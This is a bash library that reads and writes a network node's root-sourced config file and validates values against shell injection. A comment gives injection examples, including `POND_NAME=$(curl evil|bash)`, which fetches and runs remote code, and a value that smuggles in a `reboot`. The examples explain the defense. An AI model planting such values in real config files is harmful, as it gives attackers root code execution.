#!/bin/bash
################################################################
#  Copyright (C) 2016-2026 Fawcett Innovations LLC             #
#                                                              #
#  SPDX-License-Identifier: GPL-2.0-only                       #
#                                                              #
#  This program is free software; you can redistribute it      #
#  and/or modify it under the terms of the GNU General Public  #
#  License as published by the Free Software Foundation;       #
#  version 2 of the License, and no other version.             #
#                                                              #
#  This program is distributed in the hope that it will be     #
#  useful, but WITHOUT ANY WARRANTY; without even the implied  #
#  warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR     #
#  PURPOSE.  See the GNU General Public License for details.   #
#                                                              #
#  See COPYRIGHT and LICENSE at the root of this tree.         #
################################################################
# =============================================================================
# /usr/local/lib/frognet/conf.sh - [ONE_CONF_V1]
#
# Key-wise read/write for the node's single config file, /etc/frognet/tunnel.conf.
#
# PROVENANCE - READ THIS. This file was RECONSTRUCTED on 2026-08-29 from its call
# sites, not recovered from a node. No release ever packaged usr/local/lib/frognet
# (the world manifest named frognet_trace.sh and frognet_log.sh individually and
# stopped there), so install phase C1c died with
# "FATAL: /usr/local/lib/frognet/conf.sh not found" on a clean install. If an
# original turns up on a node, IT WINS - diff it against this and keep whichever
# the callers actually expect.
#
# The contract is not guesswork: eight scripts source this file and between them
# pin every name and signature below.
#
#   FROGNET_CONF        frognet-unmake-gateway.sh:25 gives the default
#                       (/etc/frognet/tunnel.conf); frognet-conf-consolidate.sh:28
#                       takes `dirname "$FROGNET_CONF"` as the config directory.
#   fn_conf_get  KEY    frognet-conf-consolidate.sh:83 tests its output for
#                       emptiness, so an absent key prints nothing and returns 0.
#   fn_conf_set  KEY V  Eleven call sites. Must be KEY-WISE: change_pond.bash:193
#                       and frognet_setup_v4_helper.bash:136 both state that
#                       rewriting the file wholesale would take GROUP_TOKEN,
#                       PASSCODE, MAX_TUNNELS and NODE_GUID with it.
#   fn_conf_unset KEY   frognet_setup_v4_helper.bash:143 - clearing the broker
#                       fields must REMOVE keys, not delete the file.
#   fn_conf_backup      frognet-conf-consolidate.sh:47 prints it
#                       (`log "  backed up $(fn_conf_backup)"`), so it writes a
#                       copy and echoes the path.
#   fn_pond_set  NAME   frognet-conf-consolidate.sh's own header states the rule:
#                       "Written to BOTH POND_NAME and GROUP_NAME."
#
# [NO_FALLBACK_V1] Nothing here substitutes a value it does not have. A missing
# key reads as empty, which is the true answer; a write that cannot happen fails.
# =============================================================================

FROGNET_CONF="${FROGNET_CONF:-/etc/frognet/tunnel.conf}"

# Read one key. Prints the value, or nothing if the key or the file is absent.
# Quotes around the value are stripped, matching how the callers' own inline
# readers parse it (frognet-conf-consolidate.sh:_get_from).
fn_conf_get() {
    local _k="${1:?fn_conf_get: KEY required}"
    [ -f "$FROGNET_CONF" ] || return 0
    local _v
    _v="$(grep -m1 "^${_k}=" "$FROGNET_CONF" 2>/dev/null | cut -d= -f2-)" || return 0
    # [CONF_INJECTION_V1] Quoted keys are written double-quoted with $, `, \ and
    # " escaped (see fn_conf_line). Strip the wrapper, then undo the escaping in
    # the same order the shell would.
    if [ "${_v#\"}" != "$_v" ] && [ "${_v%\"}" != "$_v" ]; then
        _v="${_v#\"}"; _v="${_v%\"}"
        _v="${_v//\\\"/\"}"
        _v="${_v//\\\$/\$}"
        _v="${_v//\\\`/\`}"
        _v="${_v//\\\\/\\}"
    fi
    printf '%s' "$_v"
}

# [CONF_INJECTION_V1] This file is SOURCED as root by ten scripts under
# /usr/local/bin (frognet-pond-bootstrap.sh:63, frognet_setup_v4_helper.bash's
# cmd_register, the gateway scripts, ...). Every byte written here is therefore
# shell that root will execute. Values reach this function from the network:
# frognet_setup_v4_api.php?action=apply-broker takes host/pond/pond_password/
# choruses from an unauthenticated HTTP body and hands them to
# frognet_setup_v4_helper.bash:cmd_apply_broker, which calls us.
#
# Two properties are required, and neither alone is sufficient:
#
#   1. NEWLINE REJECTION. A newline in a value ends the KEY=value line and
#      starts a fresh statement, which `source` runs.
#   2. NO UNQUOTED SHELL-ACTIVE CHARACTERS. Even on one line, an unquoted
#      value is live shell: `CHORUSES=a reboot` runs reboot with CHORUSES=a in
#      its environment, and `POND_NAME=$(curl evil|bash)` substitutes at source
#      time. The old code wrote `printf '%s=%s\n'` raw, so both worked.
#
# Keys whose values cannot contain shell-active characters get a strict
# allowlist and stay unquoted, because ~20 ad-hoc readers in the tree parse
# them with `grep '^KEY=' | cut -d= -f2-` and would inherit any quotes we add
# (opt/frognet_semantic/internet_tunnels_v3/config.py:497 splits on '=' and
# does not strip quotes either). Keys that legitimately hold spaces or
# arbitrary text (CHORUSES, POND_PASSWORD) are double-quoted with $, `, \ and "
# escaped; their only raw readers are in frognet_setup_v4_helper.bash and are
# patched to strip.
#
# [NO_FALLBACK_V1] applies: a value that fails validation is not sanitized into
# something acceptable. The write fails and says why.

# Keys written double-quoted (may contain spaces or arbitrary text).
fn_conf_is_quoted_key() {
    case "$1" in
        CHORUSES|POND_PASSWORD|PASSCODE|GROUP_TOKEN) return 0 ;;
        *) return 1 ;;
    esac
}

# Escape for inclusion in a double-quoted shell word.
fn_conf_escape() {
    local _s="$1"
    _s="${_s//\\/\\\\}"
    _s="${_s//\"/\\\"}"
    _s="${_s//\$/\\\$}"
    _s="${_s//\`/\\\`}"
    printf '%s' "$_s"
}

# Validate KEY and VALUE. Returns 1 and explains on stderr if the pair must not
# be written. Callers treat failure as fatal.
fn_conf_validate() {
    local _k="${1-}" _v="${2-}"

    case "$_k" in
        ''|*[!A-Za-z0-9_]*)
            echo "fn_conf_validate: illegal key '$_k' (want [A-Za-z0-9_]+)" >&2
            return 1 ;;
    esac

    # Newline, carriage return and NUL are rejected for every key, quoted or
    # not: a newline escapes the line entirely and no key has a use for one.
    case "$_v" in
        *$'\n'*|*$'\r'*)
            echo "fn_conf_validate: $_k value contains a newline - refusing" >&2
            return 1 ;;
    esac
    if [ "${#_v}" -gt 4096 ]; then
        echo "fn_conf_validate: $_k value too long (${#_v} bytes)" >&2
        return 1
    fi

    # Quoted keys: any printable text is safe once escaped, so only control
    # characters are rejected.
    if fn_conf_is_quoted_key "$_k"; then
        case "$_v" in
            *[[:cntrl:]]*)
                echo "fn_conf_validate: $_k value contains a control character" >&2
                return 1 ;;
        esac
        return 0
    fi

    # Unquoted keys: strict per-key allowlists. Anything not listed falls to the
    # default, which permits no shell-active character and no whitespace.
    case "$_k" in
        BROKER_URL)
            # scheme://host[:port][/path] - no query string, which is what
            # cmd_apply_broker builds. '&' and '?' are deliberately absent.
            if ! [[ "$_v" =~ ^$|^https?://[A-Za-z0-9._~%:/-]+$ ]]; then
                echo "fn_conf_validate: BROKER_URL '$_v' is not a plain http(s) URL" >&2
                return 1
            fi ;;
        POND_NAME|GROUP_NAME|NETWORK_NAME|NODE_NAME)
            if ! [[ "$_v" =~ ^$|^[A-Za-z0-9._-]{1,64}$ ]]; then
                echo "fn_conf_validate: $_k '$_v' must be 1-64 chars of [A-Za-z0-9._-]" >&2
                return 1
            fi ;;
        NODE_GUID)
            if ! [[ "$_v" =~ ^$|^[A-Za-z0-9-]{1,64}$ ]]; then
                echo "fn_conf_validate: NODE_GUID '$_v' is not a GUID" >&2
                return 1
            fi ;;
        MAX_TUNNELS|*_PORT|*_TIMEOUT|*_INTERVAL)
            if ! [[ "$_v" =~ ^$|^[0-9]{1,10}$ ]]; then
                echo "fn_conf_validate: $_k '$_v' must be numeric" >&2
                return 1
            fi ;;
        *)
            if ! [[ "$_v" =~ ^$|^[A-Za-z0-9._:/,@=+-]+$ ]]; then
                echo "fn_conf_validate: $_k value contains characters that are unsafe unquoted" >&2
                return 1
            fi ;;
    esac
    return 0
}

# Render the KEY=value line that goes on disk.
fn_conf_line() {
    local _k="$1" _v="$2"
    if fn_conf_is_quoted_key "$_k"; then
        printf '%s="%s"\n' "$_k" "$(fn_conf_escape "$_v")"
    else
        printf '%s=%s\n' "$_k" "$_v"
    fi
}

# Set one key, in place, leaving every other line untouched. Creates the file
# (and its directory) if absent. Appends if the key is new; replaces the first
# occurrence otherwise.
fn_conf_set() {
    local _k="${1:?fn_conf_set: KEY required}"
    local _v="${2-}"
    fn_conf_validate "$_k" "$_v" || {
        echo "fn_conf_set: refusing to write $_k" >&2
        return 1
    }
    local _d; _d="$(dirname "$FROGNET_CONF")"
    mkdir -p "$_d" || { echo "fn_conf_set: cannot create $_d" >&2; return 1; }
    if [ ! -f "$FROGNET_CONF" ]; then
        fn_conf_line "$_k" "$_v" > "$FROGNET_CONF" || return 1
        chmod 600 "$FROGNET_CONF" 2>/dev/null || true
        return 0
    fi
    local _tmp; _tmp="$(mktemp "${FROGNET_CONF}.XXXXXX")" || return 1
    if grep -q "^${_k}=" "$FROGNET_CONF"; then
        local _done=0
        while IFS= read -r _line || [ -n "$_line" ]; do
            case "$_line" in
                "${_k}="*)
                    if [ "$_done" -eq 0 ]; then
                        fn_conf_line "$_k" "$_v"
                        _done=1
                    else
                        printf '%s\n' "$_line"
                    fi ;;
                *) printf '%s\n' "$_line" ;;
            esac
        done < "$FROGNET_CONF" > "$_tmp"
    else
        cat "$FROGNET_CONF" > "$_tmp" || { rm -f "$_tmp"; return 1; }
        fn_conf_line "$_k" "$_v" >> "$_tmp"
    fi
    # Preserve mode/owner of the original: this file holds membership material.
    chmod --reference="$FROGNET_CONF" "$_tmp" 2>/dev/null || chmod 600 "$_tmp"
    chown --reference="$FROGNET_CONF" "$_tmp" 2>/dev/null || true
    mv -f "$_tmp" "$FROGNET_CONF"
}

# Remove one key. Absent key or absent file is not an error - the requested state
# already holds.
fn_conf_unset() {
    local _k="${1:?fn_conf_unset: KEY required}"
    [ -f "$FROGNET_CONF" ] || return 0
    grep -q "^${_k}=" "$FROGNET_CONF" || return 0
    local _tmp; _tmp="$(mktemp "${FROGNET_CONF}.XXXXXX")" || return 1
    grep -v "^${_k}=" "$FROGNET_CONF" > "$_tmp" || true
    chmod --reference="$FROGNET_CONF" "$_tmp" 2>/dev/null || chmod 600 "$_tmp"
    chown --reference="$FROGNET_CONF" "$_tmp" 2>/dev/null || true
    mv -f "$_tmp" "$FROGNET_CONF"
}

# Timestamped copy beside the original. Prints the path it wrote.
#
# The name ends .conf.<UTC timestamp> deliberately: FROGNET_NEVER_SHIP matches
# '*.conf.20*', so these backups - which carry GROUP_TOKEN and PASSCODE - can
# never reach the public repo. Suffix-anchored, so it cannot catch a real script.
fn_conf_backup() {
    [ -f "$FROGNET_CONF" ] || return 0
    local _b="${FROGNET_CONF}.$(date -u +%Y%m%dT%H%M%SZ)"
    cp -p "$FROGNET_CONF" "$_b" || { echo "fn_conf_backup: could not write $_b" >&2; return 1; }
    printf '%s' "$_b"
}

# Set the pond name. It lives under TWO keys: POND_NAME is what the setup helper
# and change_pond write, GROUP_NAME is what the tunnel daemon and broker
# registration read. frognet-conf-consolidate.sh's merge rule states they are the
# same value, so one function owns both and they cannot drift apart.
fn_pond_set() {
    local _p="${1:?fn_pond_set: POND name required}"
    fn_conf_set POND_NAME  "$_p" || return 1
    fn_conf_set GROUP_NAME "$_p" || return 1
}
